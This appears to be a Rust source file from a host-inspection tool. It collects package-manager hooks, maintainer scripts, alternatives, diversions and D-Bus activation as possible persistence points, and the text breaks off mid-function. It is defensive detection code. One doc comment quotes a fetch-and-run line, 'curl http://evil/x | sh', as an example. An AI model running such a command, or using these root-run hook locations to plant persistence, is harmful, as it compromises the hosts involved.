//! Package-manager hooks and D-Bus activation.
//!
//! One collector, because the two share an audience rather than a format:
//! both are mechanisms where somebody else's daemon runs a command line on
//! your behalf, at a moment no human chose. A package hook runs as root every
//! time anything is installed or updated — which on an unattended-upgrades
//! host is daily — and a D-Bus service file lets any process that can reach
//! the bus start a named program by asking for its name.
//!
//! The rpm half has two sources, because rpm keeps its hooks in two places.
//! Configuration under /etc and /usr/lib/rpm wires up transaction *plugins*;
//! the `%pre`/`%post` scriptlets and the `%filetrigger*`/`%transfiletrigger*`
//! scripts live in the package headers inside the rpmdb, where no file names
//! them. Both run as root on a package operation, so both are read — the
//! second through the header parser §7's provenance backend already owns.

use crate::collect::first_absolute;
use crate::text::{lossy, short_hash};
use std::collections::{BTreeMap, BTreeSet};
use std::ffi::{OsStr, OsString};
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};

use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, hex, name_from_os};
use crate::scan::{Collector, Ctx};

pub struct PkgHooks;

impl Collector for PkgHooks {
    fn name(&self) -> &'static str {
        "pkg"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = apt(cx);
        out.extend(dpkg_scripts(cx));
        out.extend(dnf_plugins(cx));
        out.extend(libdnf5_actions(cx));
        out.extend(rpm(cx));
        out.extend(apk_hooks(cx));
        out.extend(kernel_hooks(cx));
        out.extend(dpkg_cfg(cx));
        out.extend(hook_dirs(cx));
        out.extend(alternatives(cx));
        out.extend(diversions(cx));
        out.extend(dbus(cx));
        out
    }
}

/// The directories a kernel package's maintainer scripts hand to run-parts
/// on the Debian family, with the version and image path as arguments.
const KERNEL_RUN_PARTS: [&str; 5] =
    ["etc/kernel/preinst.d", "etc/kernel/postinst.d", "etc/kernel/prerm.d", "etc/kernel/postrm.d", "etc/kernel/header_postinst.d"];

/// Programs run as root each time a kernel is installed or removed: what
/// the Debian family's kernel packages run through run-parts, selected by
/// the host's own run-parts rule, and kernel-install's plugins (Fedora, and
/// wherever systemd's kernel-install is used): `*.install` in
/// /etc/kernel/install.d and /usr/lib/kernel/install.d, a same-named /etc
/// one replacing the /usr/lib one, one linked to /dev/null masking it.
fn kernel_hooks(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    let flavour = super::run_parts_flavour(cx);
    for dir in KERNEL_RUN_PARTS {
        for f in super::run_parts_dir(cx, flavour, Path::new(dir)) {
            let mut e = kernel_entry(cx, &f.rel, dir);
            e.note("run_by", "run-parts");
            if let Some(why) = f.not_run {
                e.enabled = Enablement::Disabled;
                e.note("not_run", why);
            }
            out.push(e);
        }
    }
    for (rel, shadowed_by) in super::replaceable(cx, &["etc/kernel/install.d", "usr/lib/kernel/install.d"], ".install") {
        let mut e = kernel_entry(cx, &rel, "kernel-install");
        e.note("run_by", "kernel-install");
        let masked = cx.root.read_link(&rel).is_ok_and(|t| t == Path::new("/dev/null"));
        if masked {
            e.enabled = Enablement::Masked;
        } else if let Some(by) = shadowed_by {
            e.enabled = Enablement::Disabled;
            e.note("shadowed_by", cx.root.abs(&by).display().to_string());
        } else if e.mode & 0o111 == 0 {
            e.enabled = Enablement::Disabled;
            e.note("not_run", "not executable");
        }
        out.push(e);
    }
    out
}

/// dpkg's own configuration (lib/dpkg/options.c, 1.22): every file in
/// /etc/dpkg/dpkg.cfg.d whose name is letters, digits, `_` and `-` only, in
/// order, then /etc/dpkg/dpkg.cfg, then the invoking user's ~/.dpkg.cfg,
/// root's here. A line is an option, then `=` or whitespace, then its value,
/// quotes stripped; `#` lines are comments. `pre-invoke`, `post-invoke` and
/// `status-logger` name shell commands dpkg runs as root on every run that
/// changes a package.
fn dpkg_cfg(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    let installed = ["usr/bin/dpkg", "bin/dpkg"].iter().any(|p| cx.root.exists(p));
    let dir = Path::new("etc/dpkg/dpkg.cfg.d");
    let mut names: Vec<_> = cx
        .dir(dir)
        .into_iter()
        .filter(|e| {
            let n = e.name.as_encoded_bytes();
            !n.is_empty() && n[0] != b'.' && n.iter().all(|b| b.is_ascii_alphanumeric() || *b == b'_' || *b == b'-')
        })
        .map(|e| e.name)
        .collect();
    names.sort();
    let mut files: Vec<PathBuf> = names.into_iter().map(|n| dir.join(n)).collect();
    files.push(PathBuf::from("etc/dpkg/dpkg.cfg"));
    files.push(PathBuf::from("root/.dpkg.cfg"));
    for rel in files {
        let Some(bytes) = cx.read_capped(&rel, 256 * 1024) else { continue };
        for line in bytes.split(|b| *b == b'\n') {
            let line = line.trim_ascii_end();
            if line.is_empty() || line[0] == b'#' {
                continue;
            }
            let name_end = line.iter().position(|b| !(b.is_ascii_alphanumeric() || *b == b'-')).unwrap_or(line.len());
            let option = String::from_utf8_lossy(&line[..name_end]).into_owned();
            if !matches!(option.as_str(), "pre-invoke" | "post-invoke" | "status-logger") || name_end == line.len() {
                continue;
            }
            let mut value = &line[name_end + 1..];
            if value.first() == Some(&b'=') {
                value = &value[1..];
            }
            let value = value.trim_ascii_start();
            let value = match value {
                [q @ (b'"' | b'\''), inner @ .., last] if last == q => inner,
                v => v,
            };
            let mut e = cx.entry(Kind::PkgHook, &rel, format!("dpkg:{option}:{}", hex(&blake3::hash(value).as_bytes()[..6])));
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".into());
            e.enabled = if installed { Enablement::Enabled } else { Enablement::Disabled };
            e.note("hook", option);
            e.command = Some(value.to_vec());
            out.push(e);
        }
    }
    out
}

/// Directories of programs run as root around package operations, each by
/// its tool's own selection rule. needrestart (3.6, after apt): every
/// executable in hook.d, and in notify.d less `~` and `.dpkg-*` names; a
/// restart.d file named after a unit replaces restarting it. etckeeper
/// (around apt, and daily): the executables in /etc/etckeeper/*.d whose
/// names are letters, digits and `-` only.
fn hook_dirs(cx: &mut Ctx) -> Vec<Entry> {
    // Which names each directory's tool runs.
    enum Rule {
        All,
        NotBackup,
        Etckeeper,
    }
    let selects = |rule: &Rule, n: &[u8]| match rule {
        Rule::All => true,
        Rule::NotBackup => !(n.ends_with(b"~") || n.windows(6).any(|w| w == b".dpkg-")),
        Rule::Etckeeper => !n.is_empty() && n.iter().all(|b| b.is_ascii_alphanumeric() || *b == b'-'),
    };
    let mut out = Vec::new();
    let mut dirs: Vec<(PathBuf, &str, Rule)> = vec![
        (PathBuf::from("etc/needrestart/hook.d"), "needrestart", Rule::All),
        (PathBuf::from("etc/needrestart/notify.d"), "needrestart", Rule::NotBackup),
        (PathBuf::from("etc/needrestart/restart.d"), "needrestart", Rule::All),
    ];
    for e in cx.dir("etc/etckeeper") {
        if e.is_dir && e.name.as_encoded_bytes().ends_with(b".d") {
            dirs.push((Path::new("etc/etckeeper").join(e.name), "etckeeper", Rule::Etckeeper));
        }
    }
    for (dir, tool, rule) in dirs {
        let installed = match tool {
            "needrestart" => cx.root.exists("usr/sbin/needrestart"),
            _ => cx.root.exists("usr/bin/etckeeper") || cx.root.exists("usr/sbin/etckeeper"),
        };
        let ents = cx.dir(&dir);
        for ent in ents {
            let rel = dir.join(&ent.name);
            if !cx.root.stat_follow(&rel).is_ok_and(|m| m.is_file) {
                continue;
            }
            let hook = dir.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
            let mut e = cx.entry(Kind::PkgHook, &rel, format!("{tool}:{hook}/{}", ent.name.to_string_lossy()));
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".into());
            e.target_path = Some(cx.root.abs(&rel));
            e.note("hook", format!("{tool} {hook}"));
            e.enabled = Enablement::Enabled;
            if !selects(&rule, ent.name.as_encoded_bytes()) {
                e.enabled = Enablement::Disabled;
                e.note("not_run", format!("{tool} passes over this name"));
            } else if e.mode & 0o111 == 0 {
                e.enabled = Enablement::Disabled;
                e.note("not_run", "not executable");
            } else if !installed {
                e.enabled = Enablement::Disabled;
                e.note("not_run", format!("{tool} is not installed"));
            }
            out.push(e);
        }
    }
    out
}

/// An alternative (dpkg's update-alternatives, and Fedora's) whose link
/// points somewhere its registration does not list: `editor` or `pager`, or
/// one of their slave links, turned to a file no package registered, which
/// every command naming it then runs. The registration is
/// /var/lib/dpkg/alternatives/NAME or /var/lib/alternatives/NAME: the mode,
/// the link, slave name and link pairs to a blank line, then per choice its
/// path, its priority and one line per slave.
fn alternatives(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    for dir in ["var/lib/dpkg/alternatives", "var/lib/alternatives"] {
        let ents = cx.dir(dir);
        for ent in ents {
            let rel = Path::new(dir).join(&ent.name);
            let Some(bytes) = cx.read_capped(&rel, 256 * 1024) else { continue };
            let text = String::from_utf8_lossy(&bytes);
            let lines: Vec<&str> = text.lines().collect();
            let Some(sep) = lines.iter().skip(2).position(|l| l.is_empty()).map(|p| p + 2) else { continue };
            let slaves: Vec<&str> = lines[2..sep].chunks(2).map(|c| c[0]).collect();
            // name -> the paths registered for it.
            let master = ent.name.to_string_lossy().into_owned();
            let mut choices: BTreeMap<String, BTreeSet<String>> = BTreeMap::new();
            let mut i = sep + 1;
            while i + 1 < lines.len() && !lines[i].is_empty() {
                choices.entry(master.clone()).or_default().insert(lines[i].to_string());
                for (k, slave) in slaves.iter().enumerate() {
                    if let Some(p) = lines.get(i + 2 + k).filter(|p| !p.is_empty()) {
                        choices.entry(slave.to_string()).or_default().insert(p.to_string());
                    }
                }
                i += 2 + slaves.len();
            }
            for (name, registered) in choices {
                let link = Path::new("etc/alternatives").join(&name);
                let Ok(target) = cx.root.read_link(&link) else { continue };
                let target = target.to_string_lossy().into_owned();
                if registered.contains(&target) {
                    continue;
                }
                let mut e = cx.entry(Kind::Alternative, &link, name.clone());
                e.trigger = Trigger::Always;
                e.enabled = Enablement::Enabled;
                e.target_path = Some(PathBuf::from(&target));
                e.note("registered", registered.into_iter().collect::<Vec<_>>().join(", "));
                e.note("registration", cx.root.abs(&rel).display().to_string());
                out.push(e);
            }
        }
    }
    out
}

/// dpkg diversions made by hand (`dpkg-divert --local`, recorded with `:`
/// as the package): a packaged file moved aside, so that what sits at its
/// path, and what upgrades leave alone, is someone else's. The file is
/// /var/lib/dpkg/diversions, a path, where it went and who diverted it.
fn diversions(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    let rel = Path::new("var/lib/dpkg/diversions");
    let Some(bytes) = cx.read_capped(rel, 4 << 20) else { return out };
    let text = String::from_utf8_lossy(&bytes);
    let lines: Vec<&str> = text.lines().collect();
    for chunk in lines.chunks(3) {
        let [from, to, by] = chunk else { continue };
        if *by != ":" {
            continue;
        }
        let mut e = cx.entry(Kind::DpkgDiversion, rel, from.to_string());
        e.trigger = Trigger::Always;
        e.enabled = Enablement::Enabled;
        e.target_path = Some(PathBuf::from(from));
        e.note("diverted_to", to.to_string());
        e.note("diverted_by", "dpkg-divert --local");
        out.push(e);
    }
    out
}

fn kernel_entry(cx: &mut Ctx, rel: &Path, hook: &str) -> Entry {
    let name = rel.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let mut e = cx.entry(Kind::PkgHook, rel, format!("kernel:{name}"));
    e.trigger = Trigger::PackageOp;
    e.principal = Some("root".into());
    e.enabled = Enablement::Enabled;
    e.target_path = Some(cx.root.abs(rel));
    e.note("hook", hook);
    e
}

/// D-Bus policy files are XML and a large one is still only a few kilobytes;
/// anything past this is not a policy an operator needs quoted back.
const POLICY_CAP: usize = 256 * 1024;
const TRIGGERS_CAP: usize = 64 * 1024;

// ------------------------------------------------------------------- apt ----

const APT_CONF: &str = "etc/apt/apt.conf";
const APT_CONF_D: &str = "etc/apt/apt.conf.d";

/// The apt configuration keys whose value apt hands to /bin/sh. Matched
/// against the canonical lower-case key after any `Binary::<program>::`
/// prefix is stripped, since a hook may be scoped to one front-end.
///
/// `runs_program` adds the keys that name a program apt runs without a shell.
/// Nothing else under apt.conf.d executes: the `APT::Get` options change
/// behaviour but never spawn anything, and `etc/apt/preferences.d` is pin
/// priorities only, so no entry is emitted for it.
const HOOK_KEYS: &[&str] = &[
    "dpkg::pre-invoke",
    "dpkg::post-invoke",
    "dpkg::post-invoke-success",
    "dpkg::pre-install-pkgs",
    "apt::update::pre-invoke",
    "apt::update::post-invoke",
    "apt::update::post-invoke-success",
    "apt::update::post-invoke-stats",
];

/// Files one apt run may pull in through `#include`, however they chain. A
/// real configuration has a few; the limit is for one that includes itself
/// through a dozen names.
const APT_INCLUDE_FILES: usize = 64;

/// Whether a canonical key names a program apt runs: a hook it hands to the
/// shell, one of its `Dir::Bin::` executables or directories of them (dpkg,
/// the acquire methods, the solvers, the decompressors), or the command an
/// acquire method runs to find its proxy.
fn runs_program(canon: &str) -> bool {
    HOOK_KEYS.contains(&canon)
        || canon.starts_with("dir::bin::")
        || (canon.starts_with("acquire::") && (canon.ends_with("::proxy-auto-detect") || canon.ends_with("::proxyautodetect")))
}

/// The files a configuration pulls in with `#include "file"`, as written.
/// apt reads them as configuration of their own, wherever they are.
fn apt_includes(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut out = Vec::new();
    for line in bytes.split(|b| *b == b'\n') {
        let Some(rest) = line.trim_ascii_start().strip_prefix(b"#include") else { continue };
        let rest = rest.trim_ascii_start();
        let (open, close) = match rest.first() {
            Some(b'"') => (1, b'"'),
            Some(b'<') => (1, b'>'),
            _ => (0, b';'),
        };
        let body = &rest[open..];
        let end = body.iter().position(|b| *b == close || (open == 0 && b.is_ascii_whitespace())).unwrap_or(body.len());
        if end > 0 {
            out.push(body[..end].to_vec());
        }
    }
    out
}

fn apt(cx: &mut Ctx) -> Vec<Entry> {
    let mut files: Vec<(PathBuf, Option<String>)> = vec![(PathBuf::from(APT_CONF), None)];
    for ent in cx.dir(APT_CONF_D) {
        if ent.is_dir {
            continue;
        }
        files.push((Path::new(APT_CONF_D).join(&ent.name), apt_skips(&ent.name)));
    }
    let mut visited: BTreeSet<PathBuf> = files.iter().map(|(rel, _)| rel.clone()).collect();

    let mut out = Vec::new();
    let mut at = 0;
    while at < files.len() {
        let (rel, skipped) = files[at].clone();
        at += 1;
        let Some(bytes) = cx.read(&rel) else { continue };
        for target in apt_includes(&bytes) {
            let mut e = cx.entry(Kind::PkgHook, &rel, format!("#include:{}", lossy(&target)));
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.enabled = if skipped.is_some() { Enablement::Disabled } else { Enablement::Enabled };
            e.note("manager", "apt");
            e.note("key", "#include");
            if let Some(why) = &skipped {
                e.note("not_read_by_apt", why.clone());
            }
            e.target_path = Some(PathBuf::from(OsStr::from_bytes(&target)));
            let at_root = Path::new(OsStr::from_bytes(&target)).strip_prefix("/").map(Path::to_path_buf);
            match at_root {
                Ok(inc) if skipped.is_none() && visited.len() < APT_INCLUDE_FILES && visited.insert(inc.clone()) => files.push((inc, None)),
                Ok(_) => {}
                // apt opens a relative name from its own working directory,
                // which nothing on disk records.
                Err(_) => e.note("not_followed", "a relative path: apt resolves it from its working directory"),
            }
            out.push(e);
        }
        for (key, value) in apt_conf_pairs(&bytes) {
            let Some((binary, canon)) = hook_of(&key) else { continue };
            let name = format!("{canon}:{}", short_hash(&value));
            let mut e = cx.entry(Kind::PkgHook, &rel, name);
            e.trigger = Trigger::PackageOp;
            // apt and dpkg run as root, and so does everything they invoke.
            e.principal = Some("root".to_string());
            e.enabled = match &skipped {
                Some(_) => Enablement::Disabled,
                None => Enablement::Enabled,
            };
            e.note("manager", "apt");
            // The canonical key, not the spelling in the file: apt accepts the
            // same hook written as a nested block or flattened with `::`, and
            // two spellings of one hook must not diff as two entries.
            e.note("key", canon);
            if let Some(b) = binary {
                e.note("front_end", b);
            }
            if let Some(why) = &skipped {
                e.note("not_read_by_apt", why.clone());
            }
            set_command(&mut e, &value);
            out.push(e);
        }
    }
    out
}

/// apt.conf(5): a fragment in apt.conf.d is read only if its name holds
/// nothing but alphanumerics, hyphen, underscore and period, and it has no
/// extension or the extension `.conf`. A file apt ignores is still evidence —
/// it is reported, as Disabled, because nothing runs it.
fn apt_skips(name: &OsStr) -> Option<String> {
    let bytes = name.as_bytes();
    if bytes.first() == Some(&b'.') {
        return Some("apt skips a name that starts with a dot".to_string());
    }
    if !bytes
        .iter()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'-' | b'_' | b'.'))
    {
        return Some("name holds a character apt.conf.d does not accept".to_string());
    }
    match lossy(bytes).rsplit_once('.') {
        Some((_, ext)) if ext != "conf" => {
            Some(format!("apt reads no extension or .conf, this is .{ext}"))
        }
        _ => None,
    }
}

/// `Binary::apt-get::DPkg::Post-Invoke` scopes a hook to one front-end;
/// everything after the program name is an ordinary key.
fn hook_of(key: &str) -> Option<(Option<String>, String)> {
    let lower = key.to_ascii_lowercase();
    let mut parts: Vec<&str> = lower.split("::").filter(|s| !s.is_empty()).collect();
    let mut binary = None;
    if parts.len() > 2 && parts[0] == "binary" {
        binary = Some(parts[1].to_string());
        parts.drain(..2);
    }
    let canon = parts.join("::");
    runs_program(&canon).then_some((binary, canon))
}

enum Tok {
    Word(Vec<u8>),
    Open,
    Close,
    Semi,
}

/// The apt.conf lexer. Comments are stripped here and only here, and only
/// outside a quoted string: `"curl http://evil/x | sh"` is a command with a
/// `//` in it, not a command followed by a comment, and truncating there
/// would hide the half that matters.
///
/// Every branch advances the cursor, so no input loops. The token vector is
/// bounded by the read cap: one token per byte is the worst case.
fn apt_tokens(bytes: &[u8]) -> Vec<Tok> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        match b {
            b'"' => {
                i += 1;
                let start = i;
                // apt has no escape inside a quoted string: the next quote
                // ends it, whatever precedes it.
                while i < bytes.len() && bytes[i] != b'"' {
                    i += 1;
                }
                out.push(Tok::Word(bytes[start..i].to_vec()));
                if i < bytes.len() {
                    i += 1;
                }
            }
            b'/' if bytes.get(i + 1) == Some(&b'/') => {
                while i < bytes.len() && bytes[i] != b'\n' {
                    i += 1;
                }
            }
            b'/' if bytes.get(i + 1) == Some(&b'*') => {
                i += 2;
                while i < bytes.len() && !(bytes[i] == b'*' && bytes.get(i + 1) == Some(&b'/')) {
                    i += 1;
                }
                i = (i + 2).min(bytes.len());
            }
            // `#clear` and `#include` are directives rather than settings.
            // Neither executes anything; both are skipped to end of line so a
            // path inside one cannot be mistaken for a hook.
            b'#' => {
                while i < bytes.len() && bytes[i] != b'\n' {
                    i += 1;
                }
            }
            b'{' => {
                out.push(Tok::Open);
                i += 1;
            }
            b'}' => {
                out.push(Tok::Close);
                i += 1;
            }
            b';' => {
                out.push(Tok::Semi);
                i += 1;
            }
            _ if b.is_ascii_whitespace() => i += 1,
            _ => {
                let start = i;
                while i < bytes.len()
                    && !bytes[i].is_ascii_whitespace()
                    && !matches!(bytes[i], b'{' | b'}' | b';' | b'"' | b'#')
                {
                    i += 1;
                }
                out.push(Tok::Word(bytes[start..i].to_vec()));
            }
        }
    }
    out
}

/// Flattens an apt.conf into `(key, value)` pairs, where the key is the full
/// `::`-joined path to the value.
///
/// The two spellings apt accepts collapse here:
/// `DPkg { Post-Invoke { "cmd"; }; };` and `DPkg::Post-Invoke {"cmd";};`
/// both yield `("DPkg::Post-Invoke", "cmd")`. A stray `}` pops nothing rather
/// than failing, and a `{` never closed simply leaves the stack deep — an
/// unbalanced file yields whatever it can, because a file apt itself would
/// reject is still evidence of what someone tried to install.
fn apt_conf_pairs(bytes: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut out = Vec::new();
    let mut stack: Vec<String> = Vec::new();
    let mut tag: Option<Vec<u8>> = None;
    for tok in apt_tokens(bytes) {
        match tok {
            Tok::Word(w) => match tag.take() {
                // `Tag "value"` — the pair is complete.
                Some(t) => out.push((key_of(&stack, Some(&t)), w)),
                None => tag = Some(w),
            },
            Tok::Open => {
                let scope = tag.take().map(|t| lossy(&t)).unwrap_or_default();
                stack.push(scope);
            }
            // A lone string ended by `;` or `}` is a list element, and its key
            // is the block that holds it.
            Tok::Close => {
                if let Some(t) = tag.take() {
                    out.push((key_of(&stack, None), t));
                }
                stack.pop();
            }
            Tok::Semi => {
                if let Some(t) = tag.take() {
                    out.push((key_of(&stack, None), t));
                }
            }
        }
    }
    out
}

fn key_of(stack: &[String], tag: Option<&[u8]>) -> String {
    let mut joined = stack.join("::");
    if let Some(t) = tag {
        joined.push_str("::");
        joined.push_str(&lossy(t));
    }
    joined.split("::").filter(|s| !s.is_empty()).collect::<Vec<_>>().join("::")
}

// ------------------------------------------------------------------ dpkg ----

const DPKG_INFO: &str = "var/lib/dpkg/info";

/// The maintainer scripts dpkg runs around a package operation. `.config` is
/// debconf's and runs too, but only under debconf's own frontend; it is left
/// to the enrichment pass rather than guessed at here.
const MAINTAINER_SCRIPTS: &[&str] = &["preinst", "postinst", "prerm", "postrm"];

/// Every maintainer script on the host, several hundred of them, all packaged.
/// They are emitted rather than filtered because the filter belongs downstream:
/// §8 suppresses a packaged, intact script by default, and a script that is
/// *not* packaged or not intact in this directory is one of the loudest
/// findings the tool can produce. Filtering here would delete that signal.
/// No digest exists for a maintainer script, so its contents cannot be
/// checked — but when it changed can be. dpkg writes `<pkg>.list` and the
/// package's scripts in one unpack, and an inode's change time cannot be set
/// from userspace. A script whose ctime is well after its package's list was
/// edited or planted since, by something other than dpkg.
///
/// On an image copied rather than mounted the ctimes are the copy's, and the
/// comparison says nothing; it only ever adds a note, never takes one away.
fn note_changed_after_install(cx: &Ctx, e: &mut Entry, rel: &Path, stem: &[u8]) {
    let Some((list, installed)) = crate::provenance::dpkg::list_written(cx.root, &String::from_utf8_lossy(stem)) else { return };
    let Some(changed) = cx.root.stat(rel).ok().and_then(|m| m.ctime) else { return };
    if let Some(after) = changed_after_install(changed, installed) {
        e.note(
            "changed_after_install",
            format!("inode changed {}s after {} was written", after.as_secs(), cx.root.abs(Path::new(DPKG_INFO).join(list)).display()),
        );
    }
}

use crate::provenance::dpkg::changed_after_install;

fn dpkg_scripts(cx: &mut Ctx) -> Vec<Entry> {
    let listing = cx.dir(DPKG_INFO);
    let with_triggers: BTreeSet<Vec<u8>> = listing
        .iter()
        .filter_map(|ent| ent.name.as_bytes().strip_suffix(b".triggers").map(<[u8]>::to_vec))
        .collect();

    let mut out = Vec::new();
    for ent in &listing {
        if ent.is_dir {
            continue;
        }
        let bytes = ent.name.as_bytes();
        let Some(dot) = bytes.iter().rposition(|b| *b == b'.') else { continue };
        let (stem, ext) = (&bytes[..dot], &bytes[dot + 1..]);
        if !MAINTAINER_SCRIPTS.contains(&lossy(ext).as_str()) {
            continue;
        }

        let rel = Path::new(DPKG_INFO).join(&ent.name);
        let script = lossy(ext);
        let mut e = cx.entry(Kind::PkgHook, &rel, format!("{}:{script}", lossy(stem)));
        name_from_os(&mut e, &ent.name);
        e.trigger = Trigger::PackageOp;
        e.principal = Some("root".to_string());
        e.enabled = Enablement::Enabled;
        // The script is its own command line — dpkg execs the file. There is
        // no command string to quote, and the enrichment pass hashes and
        // attributes the target.
        e.target_path = Some(cx.root.abs(&rel));
        e.note("manager", "dpkg");
        e.note("script", script.clone());
        // dpkg records digests for the files a package ships, never for its
        // own metadata, so no scan can ever verify a maintainer script
        // against anything. That is a property of the ecosystem rather than a
        // gap in this run, and the renderer needs to know the difference.
        e.note("digest_unavailable", "dpkg keeps no digest for maintainer scripts");
        note_changed_after_install(cx, &mut e, &rel, stem);
        match lossy(stem).split_once(':') {
            Some((pkg, arch)) => {
                e.note("package", pkg.to_string());
                e.note("arch", arch.to_string());
            }
            None => e.note("package", lossy(stem)),
        }

        // A file trigger is why a postinst runs when no human installed
        // anything: dpkg re-runs it whenever another package touches a watched
        // path. Without this the entry looks like it only fires at install.
        if script == "postinst" && with_triggers.contains(stem) {
            let mut triggers = OsString::from(OsStr::from_bytes(stem));
            triggers.push(".triggers");
            let trel = Path::new(DPKG_INFO).join(&triggers);
            if let Some(bytes) = cx.read_capped(&trel, TRIGGERS_CAP) {
                let interests: Vec<String> = bytes
                    .split(|b| *b == b'\n')
                    .map(<[u8]>::trim_ascii)
                    .filter(|l| !l.is_empty() && l[0] != b'#')
                    .map(lossy)
                    .collect();
                if !interests.is_empty() {
                    e.note("triggers", interests.join("; "));
                }
            }
        }
        out.push(e);
    }
    out
}

// -------------------------------------------------------------- dnf, yum ----

/// Plugin configuration directory, the manager that reads it, and where that
/// manager's global switch lives.
const PLUGIN_DIRS: &[(&str, &str, &str)] = &[
    ("etc/dnf/plugins", "dnf", "etc/dnf/dnf.conf"),
    // dnf5 is the default on current Fedora and keeps its plugin settings
    // somewhere else; its plugins are shared objects rather than python.
    ("etc/dnf/dnf5-plugins", "dnf5", "etc/dnf/dnf.conf"),
    // libdnf5's own plugins, loaded into every program using the library
    // (dnf5 and PackageKit among them); the actions plugin runs commands at
    // transaction hooks from its actions.d.
    ("etc/dnf/libdnf5-plugins", "libdnf5", "etc/dnf/dnf.conf"),
    ("etc/yum/pluginconf.d", "yum", "etc/yum.conf"),
];

/// The actions of libdnf5's actions plugin (libdnf5-plugin-actions(8)):
/// each `.actions` file in actions.d, in name order, each non-comment line
/// `callback:package_filter:direction:options:command`, the command run as
/// root by whatever uses libdnf5 when that callback fires (pre_base_setup,
/// repos_configured, pre_transaction, post_transaction and the rest), once
/// per matching package where the filter is set.
fn libdnf5_actions(cx: &mut Ctx) -> Vec<Entry> {
    let dir = Path::new("etc/dnf/libdnf5-plugins/actions.d");
    let names: Vec<_> = cx.dir(dir).into_iter().filter(|e| !e.is_dir && e.name.as_bytes().ends_with(b".actions")).map(|e| e.name).collect();
    if names.is_empty() {
        return Vec::new();
    }
    let plugin_on = cx.read("etc/dnf/libdnf5-plugins/actions.conf").and_then(|b| ini_lookup(&b, "main", "enabled")).and_then(|v| as_bool(&v)) == Some(true);
    let code = ["usr/lib64/libdnf5/plugins/actions.so", "usr/lib/libdnf5/plugins/actions.so"].iter().find(|p| cx.root.exists(p)).map(|p| cx.root.abs(p));
    let mut out = Vec::new();
    for n in names {
        let rel = dir.join(&n);
        let Some(bytes) = cx.read(&rel) else { continue };
        let file = lossy(n.as_bytes());
        for (i, line) in String::from_utf8_lossy(&bytes).lines().enumerate() {
            let t = line.trim();
            if t.is_empty() || t.starts_with('#') {
                continue;
            }
            let f: Vec<&str> = t.splitn(5, ':').collect();
            if f.len() < 5 {
                continue;
            }
            let mut e = cx.entry(Kind::PkgHook, &rel, format!("libdnf5-actions:{file}:{}:{}", f[0], i + 1));
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.note("manager", "libdnf5");
            e.note("callback", f[0]);
            if !f[1].is_empty() {
                e.note("package_filter", f[1]);
            }
            if !f[2].is_empty() {
                e.note("direction", f[2]);
            }
            if !f[3].is_empty() {
                e.note("options", f[3]);
            }
            e.command = Some(f[4].as_bytes().to_vec());
            e.enabled = Enablement::Enabled;
            if !plugin_on {
                e.enabled = Enablement::Disabled;
                e.note("not_run", "the actions plugin is not enabled in actions.conf");
            } else if code.is_none() {
                e.enabled = Enablement::Disabled;
                e.note("not_run", "libdnf5-plugin-actions is not installed");
            }
            out.push(e);
        }
    }
    out
}

fn dnf_plugins(cx: &mut Ctx) -> Vec<Entry> {
    // etc/dnf/protected.d holds package names that may not be removed. It
    // executes nothing and gets no entries.
    //
    // The interpreter directories are read only once a plugin needs looking
    // up: on a host with no dnf at all this collector never touches /usr/lib.
    let mut pythons: Option<Vec<PathBuf>> = None;
    let mut out = Vec::new();
    for (dir, manager, global) in PLUGIN_DIRS {
        let entries = cx.dir(dir);
        if entries.is_empty() {
            continue;
        }
        let plugins_off = cx
            .read(global)
            .and_then(|b| ini_lookup(&b, "main", "plugins"))
            .and_then(|v| as_bool(&v))
            == Some(false);

        for ent in entries {
            if ent.is_dir || !ent.name.as_bytes().ends_with(b".conf") {
                continue;
            }
            let rel = Path::new(dir).join(&ent.name);
            let plugin = lossy(&ent.name.as_bytes()[..ent.name.as_bytes().len() - 5]);
            let Some(bytes) = cx.read(&rel) else { continue };

            let mut e = cx.entry(Kind::PkgHook, &rel, format!("{manager}-plugin:{plugin}"));
            name_from_os(&mut e, &ent.name);
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.note("manager", *manager);
            e.note("plugin", plugin.clone());

            let enabled = ini_lookup(&bytes, "main", "enabled");
            match enabled.as_deref().and_then(as_bool) {
                Some(true) => e.enabled = Enablement::Enabled,
                Some(false) => e.enabled = Enablement::Disabled,
                None => {
                    e.enabled = Enablement::Unknown;
                    e.flag(Flag::DegradedEnablement);
                    e.note(
                        "enablement",
                        match enabled {
                            Some(v) => format!("enabled={v} is not a boolean {manager} accepts"),
                            None => format!("no enabled= key; the {manager} default applies"),
                        },
                    );
                }
            }
            if plugins_off {
                e.enabled = Enablement::Disabled;
                e.note("enablement", format!("plugins=0 in {global} disables every plugin"));
            }

            // The plugin's code is loaded by the manager itself, from a path
            // the manager decides. It is recorded so the provenance pass can
            // attribute and hash it; nothing it imports is walked.
            if pythons.is_none() {
                pythons = Some(python_dirs(cx));
            }
            match plugin_code(cx, pythons.as_deref().unwrap_or(&[]), manager, &plugin) {
                Some(path) => e.target_path = Some(cx.root.abs(&path)),
                None => e.note("code", format!("no {plugin} module on the {manager} plugin path")),
            }
            out.push(e);
        }
    }
    dnf_modules_without_conf(cx, &mut out, pythons);
    out
}

/// dnf (the python one) imports every `*.py` in its plugin directory, and
/// importing runs the module's top level as root: a plugin's `.conf` decides
/// only whether its class is then instantiated. A module dropped there with no
/// conf at all runs all the same, so each one no conf entry has claimed is
/// reported here, off only if dnf's plugins are.
fn dnf_modules_without_conf(cx: &mut Ctx, out: &mut Vec<Entry>, pythons: Option<Vec<PathBuf>>) {
    // A host with no dnf at all never has its interpreter directories read.
